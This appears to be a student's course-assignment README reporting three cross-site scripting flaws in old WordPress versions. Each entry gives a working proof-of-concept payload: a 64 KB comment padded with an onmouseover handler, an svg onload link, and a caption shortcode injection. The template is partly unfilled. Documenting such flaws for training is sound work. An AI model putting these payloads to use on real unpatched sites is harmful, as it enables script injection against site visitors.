# CodePath-Week-7
# Angie Vo (adv3ks)
# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Unathenticated Stored XSS
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2 
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: ![unauthenticated stored xss](https://user-images.githubusercontent.com/18065015/38169116-084875f0-352f-11e8-9747-450b6a514fd5.gif)
  - [ ] Steps to recreate: Posted the following comment in Javascript and made the comment longer than 64 KB:
   ```
   <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
   ```
  - [ ] Affected source code: 
    - [Link 1](http://klikki.fi/adv/wordpress2.html)
1. (Required) Authenticated XSS
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.0
    - Fixed in version: 4.2.13
  - [ ] GIF Walkthrough: ![authenticated xss](https://user-images.githubusercontent.com/18065015/38175615-62ef801a-35ad-11e8-8247-c62b87310c66.gif)
  - [ ] Steps to recreate: Create or edit a post and post the following link into the text: `https://google.com<svg onload=alert("attack")>` 
  - [ ] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0)
1. (Required) Authenticated Shortcode Tag XSS
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.5
  - [ ] GIF Walkthrough: ![authenticated shortcode tag xss](https://user-images.githubusercontent.com/18065015/38175750-5cdca156-35af-11e8-9708-ca70df846393.gif)
  - [ ] Steps to recreate: Create or edit a new post and insert the following into the text box: 
  ```
  Hello this is a test page [caption width="1" caption='<a href="' ">]<a href="http://onMouseOver='alert(100)'">Hello</a>
  ```
  - [ ] Affected source code:
    - [Link 1](http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/)


List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
